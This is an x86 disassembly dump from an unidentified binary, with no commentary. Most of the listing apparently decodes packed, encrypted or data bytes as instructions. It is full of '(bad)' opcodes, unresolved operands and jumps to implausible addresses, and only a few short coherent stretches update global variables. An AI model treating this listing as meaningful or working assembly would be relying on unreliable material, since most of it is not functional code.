  41179d:	call   0x3c53:0xf8829000
  4117a4:	sub    eax,0xcb3803c4
  4117a9:	and    ebx,DWORD PTR [ecx-0xfdaa577]
  4117af:	in     eax,0xc0
  4117b1:	mov    DWORD PTR [edi+0x75f0bc95],ecx
  4117b7:	clc    
  4117b8:	cmp    DWORD PTR [ebp-0x3fc2ac94],0x453d8632
  4117c2:	xchg   DWORD PTR [ebx+0x50],esi
  4117c5:	jbe    0x4117c3
  4117c7:	mov    edi,0x7aefad61
  4117cc:	xor    DWORD PTR [edi+eiz*2],0xa428cd05
  4117d3:	inc    ecx
  4117d5:	jle    0x41177d
  4117d7:	loopne 0x411844
  4117d9:	sahf   
  4117da:	aam    0xb0
  4117dc:	daa    
  4117dd:	mov    bl,0xf0
  4117df:	xor    al,0xa5
  4117e1:	aas    
  4117e2:	pusha  
  4117e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117e4:	mov    ebx,0x996d9100
  4117e9:	mov    eax,ds:0x25ca29d8
  4117ee:	retf   0xcb1e
  4117f1:	(bad)  
  4117f2:	fisttp QWORD PTR [eax-0x5a7a7cfe]
  4117f8:	xchg   DWORD PTR [edi-0x2445b883],eax
  4117fe:	test   al,0x62
  411800:	mov    ah,0xa1
  411802:	and    al,0x9e
  411804:	cmp    al,0xe4
  411806:	test   al,0x80
  411808:	repz mov ah,0x65
  41180b:	popf   
  41180c:	arpl   WORD PTR [edx+0x40d1927e],sp
  411812:	jno    0x41182f
  411814:	in     al,dx
  411815:	fmul   QWORD PTR [eax]
  411817:	dec    ecx
  411818:	in     al,0x20
  41181a:	sub    eax,0x4e5fe55
  41181f:	dec    edx
  411820:	sub    edi,esi
  411822:	push   eax
  411823:	test   eax,0xc6b64c9b
  411828:	mov    eax,ds:0x1447daf3
  41182d:	dec    eax
  41182e:	repz pop ds
  411830:	cli    
  411831:	mov    ?,ecx
  411833:	add    DWORD PTR ss:[ecx],esp
  411836:	das    
  411837:	mov    bl,0xb5
  411839:	jae    0x4117f1
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fdf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fe7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fe76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x4a2a5917],dl
  41187c:	mov    esi,0x70705776
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x4118f7
  411886:	jecxz  0x41186a
  411888:	lahf   
  411889:	retf   
  41188a:	pop    ds
  41188b:	test   BYTE PTR [edx+0x16],dh
  41188e:	call   0xdd515b72
  411893:	adc    BYTE PTR [eax+eax*1+0x78],0xd4
  411898:	mov    esp,0x1deedc55
  41189d:	stos   DWORD PTR es:[edi],eax
  41189e:	ins    BYTE PTR es:[edi],dx
  41189f:	fdiv   DWORD PTR [esp+ecx*1]
  4118a2:	dec    esi
  4118a3:	push   edi
  4118a4:	mov    ebp,0x195f7a19
  4118a9:	or     ah,BYTE PTR [ebp+esi*8-0x80]
  4118ad:	sub    DWORD PTR [edx-0x79bc6793],ecx
  4118b3:	es ins DWORD PTR es:[edi],dx
  4118b5:	adc    eax,0x973b9f22
  4118ba:	and    edi,DWORD PTR [edx]
  4118bc:	repz imul ebx,DWORD PTR [edi+0x59c40fc8],0xffffff94
  4118c4:	leave  
  4118c5:	xchg   edx,eax
  4118c6:	enter  0xf999,0xe0
  4118ca:	push   edi
  4118cb:	mov    cl,0x91
  4118cd:	in     eax,dx
  4118ce:	or     DWORD PTR [ecx+0xcce3e74],edx
  4118d4:	pop    esi
  4118d5:	fnsave [eax-0x620cc958]
  4118db:	mov    al,ds:0x916e39ae
  4118e0:	rcl    cl,cl
  4118e2:	xor    al,0xe4
  4118e4:	add    ah,ah
  4118e6:	outs   dx,DWORD PTR ds:[esi]
  4118e7:	dec    ebp
  4118e9:	push   ecx
  4118ea:	imul   eax,DWORD PTR [esi+0x5b],0xffffffd2
  4118ee:	(bad)  
  4118ef:	cmc    
  4118f0:	xchg   ecx,eax
  4118f1:	out    0xfc,al
  4118f3:	lods   eax,DWORD PTR ds:[esi]
  4118f4:	enter  0x6b39,0x11
  4118f8:	loopne 0x41191a
  4118fa:	and    ebx,DWORD PTR [edx-0x1c]
  4118fd:	fisttp DWORD PTR [ecx+edi*1-0x1d]
  411901:	jmp    0x411959
  411903:	xchg   esi,eax
  411904:	or     eax,0x1c620ee4
  411909:	in     eax,0x7a
  41190b:	fst    st(4)
  41190d:	cdq    
  41190e:	add    eax,0x7b543399
  411913:	push   ebx
  411914:	lods   eax,DWORD PTR es:[esi]
  411916:	pop    ss
  411917:	dec    edx
  411918:	repnz push esp
  41191a:	mov    ah,0x4b
  41191c:	inc    edi
  41191d:	dec    esi
  41191e:	sub    al,BYTE PTR [edx-0x59]
  411921:	aas    
  411922:	lea    esi,[edx-0x13]
  411925:	lds    eax,FWORD PTR [eax-0x67]
  411928:	mov    esi,esp
  41192a:	mov    cl,0x52
  41192c:	or     eax,0xff6b226b
  411931:	sbb    edx,ecx
  411933:	daa    
  411934:	inc    edx
  411935:	xor    DWORD PTR [ebx],esp
  411937:	test   eax,0x4f8629ac
  41193c:	cdq    
  41193d:	xor    eax,0x9c938262
  411942:	sbb    dh,dh
  411944:	dec    ebp
  411945:	mov    edi,0xd9643e11
  41194a:	jbe    0x4118d6
  41194c:	into   
  41194d:	js     0x411981
  41194f:	sbb    bh,BYTE PTR [esi-0x3fe751a7]
  411955:	out    dx,al
  411956:	mov    ebp,0xb0ea5c92
  41195b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41195c:	pop    ss
  41195d:	mov    esp,0x70d4be0d
  411962:	loopne 0x41198d
  411964:	push   esp
  411965:	sub    al,0xf4
  411967:	jnp    0x411910
  411969:	mov    ds,WORD PTR [esi+eiz*2]
  41196c:	push   ecx
  41196d:	pop    ebp
  41196e:	pop    ss
  41196f:	imul   edx,DWORD PTR [eax+ebp*1+0x45],0xffffffec
  411974:	hlt    
  411975:	mov    ecx,0x474d3593
  41197a:	gs dec esp
  41197c:	and    al,0x82
  41197e:	xchg   ebx,eax
  41197f:	fild   DWORD PTR [edx]
  411981:	jmp    0xa35ef5a0
  411986:	hlt    
  411987:	scas   eax,DWORD PTR es:[edi]
  411988:	push   edi
  411989:	stos   DWORD PTR es:[edi],eax
  41198a:	bnd jbe 0x411994
  41198d:	lahf   
  41198e:	dec    esi
  41198f:	rcr    ch,1
  411991:	cs inc ebx
  411993:	pop    ecx
  411994:	xchg   edi,eax
  411995:	jnp    0x4119cf
  411997:	inc    edi
  411998:	es test eax,0x603a6572
  41199e:	adc    al,0x4f
  4119a0:	retf   
  4119a1:	jle    0x4119ef
  4119a3:	xchg   esp,eax
  4119a4:	inc    edi
  4119a5:	mov    ebx,0xa2ec5597
  4119aa:	push   eax
  4119ab:	add    DWORD PTR [esi-0x42],eax
  4119ae:	stos   BYTE PTR es:[edi],al
  4119af:	fild   QWORD PTR [ecx+0x7a20a4e6]
  4119b5:	inc    ecx
  4119b6:	aad    0xba
  4119b8:	aas    
  4119b9:	mov    dl,0x78
  4119bb:	mov    al,0xa8
  4119bd:	fwait
  4119be:	and    DWORD PTR [eax-0x5],esp
  4119c1:	pop    ebx
  4119c2:	jp     0x411a26
  4119c4:	leave  
  4119c5:	and    BYTE PTR [ecx+0x25],cl
  4119c8:	or     BYTE PTR [esi+0x12b0c5b6],bh
  4119ce:	dec    edi
  4119cf:	or     al,0xd5
  4119d1:	push   edx
  4119d2:	mov    eax,DWORD PTR [esi]
  4119d4:	push   esi
  4119d5:	xchg   esi,eax
  4119d6:	mov    edi,fs
  4119d8:	outs   dx,DWORD PTR ds:[esi]
  4119d9:	lock test DWORD PTR [ecx+0x63b9054f],ecx
  4119e0:	sub    al,0x16
  4119e2:	ret    0x1a47
  4119e5:	push   es
  4119e6:	push   ecx
  4119e7:	mov    WORD PTR [ecx+0x8e2b6db],cs
  4119ed:	or     eax,0x1bcf63be
  4119f2:	retf   
  4119f3:	dec    eax
  4119f4:	inc    ebx
  4119f5:	xchg   edi,eax
  4119f6:	fdivr  st(7),st
  4119f8:	out    dx,eax
  4119f9:	test   al,0x4e
  4119fb:	mov    esi,0xaf7ddaae
  411a00:	add    dl,cl
  411a02:	push   ebp
  411a03:	and    BYTE PTR cs:0x8f372f40,ch
  411a0a:	pop    edx
  411a0b:	jno    0x41199a
  411a0d:	arpl   WORD PTR [ebx-0x3d],dx
  411a10:	push   edi
  411a11:	les    edx,FWORD PTR [edi-0x2ff8b3e5]
  411a17:	retf   
  411a18:	xor    eax,0x29cd611c
  411a1d:	lods   eax,DWORD PTR ds:[esi]
  411a1e:	(bad)  
  411a1f:	pop    ebp
  411a20:	cmp    BYTE PTR cs:[esp+eax*8-0x4d],dh
  411a25:	sbb    edi,ecx
  411a27:	ret    
  411a28:	(bad)  
  411a29:	pop    ecx
  411a2a:	xchg   esp,eax
  411a2b:	call   0x85be694
  411a30:	not    DWORD PTR [ebp-0x52]
  411a33:	jecxz  0x411a4f
  411a35:	fisub  DWORD PTR [ecx+eiz*1-0x16]
  411a39:	jne    0x4119ce
  411a3b:	and    al,0x98
  411a3d:	popf   
  411a3e:	loopne 0x411a0c
  411a40:	jmp    0xd7b91f35
  411a45:	retf   
  411a46:	push   ecx
  411a47:	int3   
  411a48:	test   DWORD PTR [ebx+edi*2-0xf],eax
  411a4c:	dec    edi
  411a4d:	pop    esp
  411a4e:	test   al,0x22
  411a50:	sbb    eax,0xbed2a170
  411a55:	push   ds
  411a56:	(bad)
  411a59:	cmp    DWORD PTR [edx-0x5a],eax
  411a5c:	adc    dh,al
  411a5e:	clc    
  411a5f:	sub    DWORD PTR [ebp+0x4a],eax
  411a62:	out    dx,eax
  411a63:	fmul   st,st(0)
  411a65:	pop    esp
  411a66:	pushf  
  411a67:	imul   ecx,DWORD PTR [edx+0x56],0x34a0187b
  411a6e:	(bad)  [ebx+0x2de7a15a]
  411a74:	jo     0x411a2f
  411a76:	(bad)  
  411a77:	hlt    
  411a78:	jmp    0x2106:0xeac43680
  411a7f:	fs adc esp,esp
  411a82:	jne    0x411a3c
  411a84:	push   ss
  411a85:	int3   
  411a86:	mov    ?,edi
  411a88:	rep ins BYTE PTR es:[edi],dx
  411a8a:	pushf  
  411a8b:	mov    eax,ds:0x1e4ae855
  411a90:	rcr    BYTE PTR [edi+0x2a6c7a23],1
  411a96:	xchg   esp,eax
  411a97:	jle    0x411a4e
  411a99:	aam    0xc7
  411a9b:	jb     0x411ac6
  411a9d:	jge    0x411a5e
  411a9f:	retf   0xcc02
  411aa2:	in     al,0x26
  411aa4:	push   DWORD PTR ds:0x7146e2a6
  411aaa:	push   cs
  411aab:	xor    al,0x8e
  411aad:	jmp    0xb220:0x4d7537fa
  411ab4:	dec    esp
  411ab5:	or     ebp,DWORD PTR [esi-0x11]
  411ab8:	scas   al,BYTE PTR es:[edi]
  411ab9:	jmp    0x2cad1644
  411abe:	mov    ecx,0x401cb90d
  411ac3:	add    bh,BYTE PTR ss:[edi-0x47]
  411ac7:	scas   al,BYTE PTR es:[edi]
  411ac8:	jp     0x411ad3
  411aca:	in     al,0x69
  411acc:	dec    ebp
  411acd:	xchg   ebx,eax
  411ace:	or     bl,BYTE PTR [edx]
  411ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ad1:	in     al,dx
  411ad2:	xor    DWORD PTR [ebp-0x5f],ebx
  411ad5:	xor    bh,BYTE PTR [esi]
  411ad7:	(bad)  
  411ada:	retf   0xb7ff
  411add:	mov    edi,0xea1a93a7
  411ae2:	xchg   esp,eax
  411ae3:	jg     0x411b2c
  411ae5:	xor    eax,0xbf6e935
  411aea:	cmp    DWORD PTR [eax+esi*8],0x47
  411aee:	lock mov dh,0x13
  411af1:	gs jmp 0x9bb6:0x7c453cca
  411af9:	bound  ebp,QWORD PTR [ebx-0x2c6c7b07]
  411aff:	wbinvd 
  411b01:	pop    ss
  411b02:	lods   eax,DWORD PTR ds:[esi]
  411b03:	jl     0x411b62
  411b05:	ins    DWORD PTR es:[edi],dx
  411b06:	dec    esp
  411b07:	mov    edx,0x4eab019e
  411b0c:	jno    0x411a97
  411b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b0f:	jb     0x411a9a
  411b11:	or     BYTE PTR [esp+esi*1],0x30
  411b15:	inc    edi
  411b16:	jbe    0x411b84
  411b18:	retf   0xeb01
  411b1b:	cli    
  411b1c:	mov    ecx,0x14af63ce
  411b21:	jg     0x411b7c
  411b23:	inc    ebx
  411b24:	(bad)  
  411b25:	fucomi st,st(5)
  411b27:	or     al,0xb0
  411b29:	cld    
  411b2a:	adc    DWORD PTR [eax],eax
  411b2c:	fcom   DWORD PTR [edi-0x24a229ae]
  411b32:	mov    WORD PTR [eax*1+0x65efeca9],es
  411b39:	sub    al,0xfd
  411b3b:	sub    ah,BYTE PTR [edi-0x1a]
  411b3e:	call   0x372d2c1
  411b43:	ins    BYTE PTR es:[edi],dx
  411b44:	dec    edi
  411b45:	stc    
  411b46:	or     ch,al
  411b48:	inc    edi
  411b49:	enter  0xc9d3,0x9d
  411b4d:	stos   BYTE PTR es:[edi],al
  411b4e:	jle    0x411ae8
  411b50:	xlat   BYTE PTR ds:[ebx]
  411b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b52:	jmp    0x411b66
  411b54:	jbe    0x411b8b
  411b56:	retf   
  411b57:	fwait
  411b58:	or     al,0xcc
  411b5a:	mov    ebx,es
  411b5c:	stos   DWORD PTR es:[edi],eax
  411b5d:	js     0x411b91
  411b5f:	pop    ds
  411b60:	cli    
  411b61:	push   ds
  411b62:	cmp    ch,BYTE PTR [edi+0x59]
  411b65:	call   0x72d0:0xf771e0e5
  411b6c:	clc    
  411b6d:	push   0x19
  411b6f:	pop    ecx
  411b70:	inc    ecx
  411b71:	mov    bh,0x70
  411b73:	pop    ds
  411b74:	std    
  411b75:	mov    al,BYTE PTR [ebx+0x6b0ea2e6]
  411b7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b7c:	imul   esi,DWORD PTR fs:[edx+ebp*2+0x2216ab8a],0xffffffbb
  411b85:	test   eax,0x13a9b92f
  411b8a:	push   esp
  411b8b:	pop    ebp
  411b8c:	dec    ebp
  411b8d:	mov    BYTE PTR [ebx-0x5e87fb6f],cl
  411b93:	out    0xcc,al
  411b95:	add    ah,bl
  411b97:	es mov dl,0x5f
  411b9a:	mov    esp,0xddf4bc13
  411b9f:	jl     0x411b9d
  411ba1:	add    eax,0x5a601a39
  411ba6:	xor    eax,0x90596883
  411bab:	sub    DWORD PTR [ecx-0x6f],ecx
  411bae:	cmp    eax,0x22632106
  411bb3:	call   0xc3a0:0x6be7cfd
  411bba:	gs retf 
  411bbc:	add    DWORD PTR [edx],eax
  411bbe:	adc    DWORD PTR [edi],ebx
  411bc0:	push   eax
  411bc1:	pop    esp
  411bc2:	dec    ecx
  411bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc4:	or     al,BYTE PTR [eax+0x63]
  411bc7:	lds    eax,FWORD PTR [ebx-0x1eff8df7]
  411bcd:	scas   al,BYTE PTR es:[edi]
  411bce:	jg     0x411c46
  411bd0:	in     al,0xb5
  411bd2:	into   
  411bd3:	mov    edx,0xca83e997
  411bd8:	and    ebx,DWORD PTR [ecx+0x33636fc4]
  411bde:	rol    DWORD PTR [edx+edi*1],1
  411be1:	cmc    
  411be2:	mov    ebp,0xd3f382eb
  411be7:	rcl    BYTE PTR [edi+0x1b],cl
  411bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411beb:	sbb    BYTE PTR [ecx],dh
  411bed:	nop
  411bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bef:	pop    ecx
  411bf0:	xor    dh,BYTE PTR [eax+esi*8]
  411bf3:	jle    0x411c39
  411bf5:	aas    
  411bf6:	in     al,0x2a
  411bf8:	std    
  411bf9:	es cmp al,0x71
  411bfc:	dec    ebx
  411bfd:	inc    ebx
  411bfe:	je     0x411c42
  411c00:	lahf   
  411c01:	std    
  411c02:	add    al,0x5a
  411c04:	jnp    0x411be2
  411c06:	mov    BYTE PTR [eax+0x49b9e548],bl
  411c0c:	and    eax,0x5ddbf3d
  411c11:	jno    0x411b97
  411c13:	jp     0x411c66
  411c15:	and    al,0xbc
  411c17:	jge    0x411bbd
  411c19:	mov    cl,0xfb
  411c1b:	(bad)  
  411c1c:	in     al,dx
  411c1d:	cmp    al,0x12
  411c1f:	and    BYTE PTR [edi],ch
  411c21:	pop    eax
  411c22:	cld    
  411c23:	cmp    ebx,ecx
  411c25:	sbb    DWORD PTR [edi],0x17
  411c28:	sbb    al,cl
  411c2a:	test   BYTE PTR [ecx+0x4c],al
  411c2d:	test   BYTE PTR [eax-0x60],0xc5
  411c31:	sbb    al,BYTE PTR [ebp-0x1f35cc1d]
  411c37:	out    dx,al
  411c38:	stos   BYTE PTR es:[edi],al
  411c39:	adc    ebx,DWORD PTR [ecx-0x74]
  411c3c:	sbb    DWORD PTR [ecx-0x428c24ad],ebp
  411c42:	sbb    edx,esi
  411c44:	jmp    0xfde2cc04
  411c49:	mov    al,ds:0xbd9acca7
  411c4e:	xchg   esp,eax
  411c4f:	jl     0x411be3
  411c51:	into   
  411c52:	mov    eax,DWORD PTR [esi+0xc]
  411c55:	inc    esi
  411c56:	add    ch,cl
  411c58:	call   0xbff92c73
  411c5d:	jb     0x411c39
  411c5f:	mov    al,ds:0x8d60f72e
  411c64:	mov    edx,0xe7869a5d
  411c69:	jmp    0xa20b900c
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x65b0be5e
  411cb8:	and    ebx,DWORD PTR [esi+0x53]
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411d22
  411cc2:	add    eax,0xc3e6ae4f
  411cc7:	push   edx
  411cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cc9:	stc    
  411cca:	jnp    0x411c63
  411ccc:	mov    cl,0x57
  411cce:	xchg   ebx,eax
  411ccf:	fbstp  TBYTE PTR [edx]
  411cd1:	shl    edx,0xee
  411cd4:	or     edi,DWORD PTR [edi+0x7ed85d59]
  411cda:	sub    eax,0x40a4b5b
  411cdf:	in     eax,dx
  411ce0:	and    al,bh
  411ce2:	and    DWORD PTR [edi-0x49],edx
  411ce5:	loopne 0x411d21
  411ce7:	pop    ecx
  411ce8:	call   0xb4f4:0xd45d675a
  411cef:	inc    esi
  411cf0:	pushf  
  411cf1:	inc    ecx
  411cf2:	aaa    
  411cf3:	div    cl
  411cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cf6:	out    0x5c,eax
  411cf8:	cmp    al,0xcf
  411cfa:	fwait
  411cfb:	xor    al,0xf2
  411cfd:	dec    edx
  411cfe:	jnp    0x411d65
  411d00:	and    esp,DWORD PTR ds:0x52f1aa26
  411d06:	sub    eax,0x5f5cf841
  411d0b:	jbe    0x411cde
  411d0d:	out    dx,al
  411d0e:	mov    dl,0x67
  411d10:	repz arpl bp,cx
  411d13:	fild   QWORD PTR [esi+0x38bd0e0]
  411d19:	in     al,0x66
  411d1b:	xor    BYTE PTR [edi-0x648b47c8],ch
  411d21:	cwde   
  411d22:	das    
  411d23:	xor    al,0xe0
  411d25:	inc    esi
  411d26:	pop    esp
  411d27:	pop    esi
  411d28:	loop   0x411d41
  411d2a:	(bad)  
  411d2b:	loop   0x411d4c
  411d2d:	rcl    dl,cl
  411d2f:	jl     0x411d4d
  411d31:	adc    ecx,DWORD PTR ss:[edi+ebp*2+0x341a88df]
  411d39:	push   0x7b
  411d3b:	rol    DWORD PTR [ebx-0x5592f0bd],1
  411d41:	loope  0x411d04
  411d43:	outs   dx,BYTE PTR ds:[esi]
  411d44:	and    dh,BYTE PTR [esi+0x2e]
  411d47:	popa   
  411d48:	or     eax,0x33f9700d
  411d4d:	(bad)  
  411d4e:	mov    ebp,?
  411d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d51:	and    eax,0xba3dab8
  411d56:	test   al,0x37
  411d58:	dec    edx
  411d59:	in     al,0x6
  411d5b:	pop    edi
  411d5c:	mov    ecx,0x2db5d802
  411d61:	div    DWORD PTR [eax+0x424acedc]
  411d67:	frstor [esi+0x52]
  411d6a:	fs mov ch,0x78
  411d6d:	aad    0x73
  411d6f:	repnz lock jecxz 0x411d13
  411d73:	repnz sub eax,0xd1946cb0
  411d79:	fcmove st,st(6)
  411d7b:	xor    edx,eax
  411d7d:	icebp  
  411d7e:	mov    WORD PTR [edx+0x24b0a9e6],fs
  411d84:	mov    ebp,0x137df05
  411d89:	push   edx
  411d8a:	mov    ds:0x9e56bff,eax
  411d8f:	mov    eax,0xb23b75ed
  411d94:	bswap  ebx
  411d96:	iret   
  411d97:	jmp    0x411d3b
  411d99:	jne    0x411d7e
  411d9b:	dec    edi
  411d9c:	cmp    ah,dh
  411d9e:	repnz pop ebp
  411da0:	data16 stos BYTE PTR es:[edi],al
  411da2:	lods   al,BYTE PTR ds:[esi]
  411da3:	je     0x411e1c
  411da5:	pop    ss
  411da6:	push   esi
  411da7:	stos   BYTE PTR es:[di],al
  411da9:	pop    ecx
  411daa:	imul   edx,DWORD PTR [edi],0x66a10c25
  411db0:	push   eax
  411db1:	push   ss
  411db2:	test   BYTE PTR [ecx],bh
  411db4:	dec    edi
  411db5:	outs   dx,DWORD PTR ds:[esi]
  411db6:	pop    esi
  411db7:	mov    esi,0x8bd86dab
  411dbc:	or     bl,BYTE PTR [edi+0x72]
  411dbf:	xchg   edi,eax
  411dc0:	stc    
  411dc1:	add    al,0x0
  411dc3:	add    al,0x65
  411dc5:	ss dec ecx
  411dc7:	scas   eax,DWORD PTR es:[edi]
  411dc8:	adc    al,0xb1
  411dca:	jecxz  0x411dc1
  411dcc:	dec    esp
  411dcd:	mov    ebx,0x2f8a7a62
  411dd2:	jns    0x411dbc
  411dd4:	mov    ebp,0x76467826
  411dd9:	adc    DWORD PTR [edx-0x618c13d9],0xaad2dc8b
  411de3:	ror    BYTE PTR [edi-0x46],1
  411de6:	cwde   
  411de7:	mov    dl,0xf3
  411de9:	add    al,bl
  411deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dec:	push   edi
  411ded:	jno    0x411e29
  411def:	push   ss
  411df0:	inc    ebp
  411df1:	(bad)  
  411df2:	lahf   
  411df3:	sbb    al,0x1e
  411df5:	retf   
  411df6:	add    esp,esi
  411df8:	xor    esp,eax
  411dfa:	cmp    eax,0x7c778d6f
  411dff:	or     ch,BYTE PTR [ebp+ebx*1+0x1327a8b0]
  411e06:	rcl    BYTE PTR [eax+0x3c9e1c58],cl
  411e0c:	add    al,0xe4
  411e0e:	outs   dx,DWORD PTR ds:[esi]
  411e0f:	out    0x45,al
  411e11:	xchg   ebx,eax
  411e12:	mov    bl,0x98
  411e14:	push   edi
  411e15:	clc    
  411e16:	imul   edi,DWORD PTR [ebx],0xcc0a4add
  411e1c:	or     BYTE PTR [edx-0x2e9892ea],ch
  411e22:	int    0x36
  411e24:	shr    BYTE PTR [ebx+0x7202fa44],1
  411e2a:	fistp  DWORD PTR [ecx]
  411e2c:	fcom   DWORD PTR ds:0x6faf2389
  411e32:	inc    ecx
  411e33:	jecxz  0x411e57
  411e35:	mov    eax,ds:0x28d94b58
  411e3a:	cld    
  411e3b:	pop    ss
  411e3c:	fs sahf 
  411e3e:	loopne 0x411df4
  411e40:	ins    DWORD PTR es:[edi],dx
  411e41:	dec    edx
  411e42:	mov    bl,0xc
  411e44:	mov    eax,ds:0x3001e5a6
  411e49:	jmp    0xee1e4a86
  411e4e:	cwde   
  411e4f:	mov    dl,0x78
  411e51:	jmp    0x411ec0
  411e53:	rcl    eax,cl
  411e55:	mul    BYTE PTR [ebp+0x3]
  411e58:	cli    
  411e59:	loop   0x411e24
  411e5b:	sub    edx,eax
  411e5d:	xor    ah,bl
  411e5f:	fdivr  st(6),st
  411e61:	add    edx,DWORD PTR [eax]
  411e63:	in     eax,dx
  411e64:	inc    edi
  411e65:	dec    esp
  411e66:	in     eax,dx
  411e67:	inc    edx
  411e68:	(bad)  
  411e69:	stos   DWORD PTR es:[edi],eax
  411e6a:	inc    ebp
  411e6b:	cli    
  411e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e6d:	xchg   edx,eax
  411e6e:	sti    
  411e6f:	lods   al,BYTE PTR ds:[esi]
  411e70:	dec    eax
  411e71:	addr16 pop ds
  411e73:	fimul  DWORD PTR [edi+0x55]
  411e76:	and    DWORD PTR [ecx+0x40],esp
  411e79:	jle    0x411e5e
  411e7b:	fimul  WORD PTR [eax+eax*2+0x50971e28]
  411e82:	push   edx
  411e83:	iret   
  411e84:	test   al,0x0
  411e86:	push   eax
  411e87:	mov    DWORD PTR [esi-0x442b9726],edx
  411e8d:	push   ecx
  411e8e:	lods   al,BYTE PTR ds:[esi]
  411e8f:	jae    0x411e47
  411e91:	ss inc ebx
  411e93:	jp     0x411e37
  411e95:	(bad)  
  411e96:	outs   dx,BYTE PTR ds:[esi]
  411e97:	inc    ecx
  411e98:	jmp    0x5aaf6b5f
  411e9d:	and    dl,BYTE PTR ds:0xb752a658
  411ea3:	xor    esp,ecx
  411ea5:	fstp   st(2)
  411ea7:	outs   dx,DWORD PTR ds:[esi]
  411ea8:	mov    ebx,0x26a2ed48
  411ead:	xchg   ebp,eax
  411eae:	inc    edx
  411eaf:	hlt    
  411eb0:	or     al,0x7f
  411eb2:	(bad)  
  411eb3:	test   DWORD PTR [eax-0x11],0x38d4e448
  411eba:	cmp    BYTE PTR [ecx+0x7d219f6d],0x32
  411ec1:	sbb    al,0x1d
  411ec3:	in     eax,0x8e
  411ec5:	scas   al,BYTE PTR es:[edi]
  411ec6:	in     eax,dx
  411ec7:	push   esp
  411ec8:	mov    cl,0x24
  411eca:	mov    al,0x86
  411ecc:	xchg   ecx,eax
  411ecd:	addr16 xor dh,ah
  411ed0:	inc    ebx
  411ed1:	(bad)  
  411ed4:	cmp    DWORD PTR [esi+0x7b7325ab],ebp
  411eda:	jmp    0x411efc
  411edc:	cmp    eax,0xe45c7d2d
  411ee1:	retf   
  411ee2:	repz push cs
  411ee4:	out    dx,al
  411ee5:	int    0xde
  411ee7:	push   esp
  411ee8:	sbb    eax,0x84b9946c
  411eed:	mov    edx,0x584d6308
  411ef2:	mov    bh,0x97
  411ef4:	iret   
  411ef5:	into   
  411ef6:	inc    ecx
  411ef7:	out    dx,al
  411ef8:	retf   0x3a94
  411efb:	push   edi
  411efc:	lea    esp,[eax]
  411efe:	adc    eax,0x76a4fd4a
  411f03:	fmul   DWORD PTR [eax+0x7f]
  411f06:	mov    eax,0x847c87e6
  411f0b:	dec    ebp
  411f0c:	in     eax,dx
  411f0d:	dec    BYTE PTR [esi]
  411f0f:	dec    eax
  411f10:	xor    BYTE PTR [edx],bh
  411f12:	cmp    ah,BYTE PTR [edi-0x42cc6a52]
  411f18:	pop    ecx
  411f19:	cmp    eax,0x11da0b3e
  411f1e:	push   ecx
  411f1f:	mov    cl,BYTE PTR [ebx+0x47]
  411f22:	data16 das 
  411f24:	pusha  
  411f25:	adc    ah,BYTE PTR [eax]
  411f27:	cmp    eax,0x24e879aa
  411f2c:	(bad)  
  411f2d:	pop    edi
  411f2e:	push   DWORD PTR [edi+ebp*8-0x29100fcc]
  411f35:	mov    dh,0x47
  411f37:	add    edx,ebx
  411f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f3a:	inc    ebp
  411f3b:	cmp    eax,ecx
  411f3d:	jbe    0x411f6b
  411f3f:	adc    al,0x19
  411f41:	inc    eax
  411f42:	sub    BYTE PTR [edi+0x2b564a5f],ah
  411f48:	enter  0x1e03,0xcb
  411f4c:	sub    ebx,edi
  411f4e:	mov    bl,0xd2
  411f50:	cmp    DWORD PTR [ecx+0x6497d021],0x6fd66a50
  411f5a:	retf   
  411f5b:	aad    0xad
  411f5d:	sub    esp,DWORD PTR [esi]
  411f5f:	(bad)  
  411f60:	and    BYTE PTR [esi-0x56d85508],dl
  411f66:	loopne 0x411f79
  411f68:	lods   al,BYTE PTR ds:[esi]
  411f69:	fimul  WORD PTR ds:0x3a76d60a
  411f6f:	sti    
  411f70:	mov    esi,0xe743414b
  411f75:	ret    0xedba
  411f78:	(bad)  
  411f7a:	ror    BYTE PTR [edi+0x2f],cl
  411f7d:	repz lahf 
